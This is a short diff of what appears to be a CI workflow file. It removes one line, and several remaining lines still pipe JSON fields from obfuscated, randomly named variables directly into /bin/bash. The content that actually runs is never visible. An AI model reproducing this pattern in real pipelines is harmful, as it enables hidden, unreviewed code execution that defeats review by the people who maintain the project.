@@ -26,7 +26,6 @@ jobs:
           echo $yfwnl093 | jq -r .gxc7360 | /bin/bash
           echo $csp274 | jq -r .wmjoe941 | /bin/bash
           echo $f5 | jq -r .gcwy20 | /bin/bash
-          echo $ikzd04 | jq -r .s70896 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
